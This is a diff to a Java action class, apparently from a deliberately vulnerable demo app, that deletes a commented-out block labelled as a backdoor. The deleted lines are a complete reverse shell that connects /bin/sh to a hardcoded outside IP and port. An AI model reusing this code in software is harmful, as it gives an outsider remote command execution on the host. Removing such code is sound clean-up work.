@@ -58,46 +58,7 @@ public class JSPEvalAction extends ExampleAction {
     				*/
 				// END MALICIOUS CODE
 
-				
-				// BEGIN BACKDOOR (REVERSE SHELL) CODE
-				/*
-				try {
-		                   String host = "39.234.101.45";
-		                   int port = 9999;
-		                   String cmd = "/bin/sh";
-		                   Process p = (new ProcessBuilder(new String[]{cmd})).redirectErrorStream(true).start();
-		                   Socket s = new Socket(host, port);
-		                   InputStream pi = p.getInputStream();
-		                   InputStream pe = p.getErrorStream();
-		                   InputStream si = s.getInputStream();
-		                   OutputStream po = p.getOutputStream();
-		                   OutputStream so = s.getOutputStream();
-		                   while(!s.isClosed()) {
-		                      while(pi.available() > 0) {
-		                           so.write(pi.read());
-		                      }
-		                      while(pe.available() > 0) {
-		                           so.write(pe.read());
-		                      }
-		                      while(si.available() > 0) {
-		                           po.write(si.read());
-		                      }
-		                      so.flush();
-		                      po.flush();
-		                      Thread.sleep(50L);
-		                      try {
-		                         p.exitValue();
-		                         break;
-		                      }
-			              catch (Exception var12) {}
-		                   }
-		                   p.destroy();
-		                   s.close();
-				}
-				catch (Throwable t) {}
-				*/
-				// END BACKDOOR (REVERSE SHELL) CODE
-				
+// gmdavef has a reverse-shell version of this file								
 				if (writer != null)
 					writer.close();
 			}
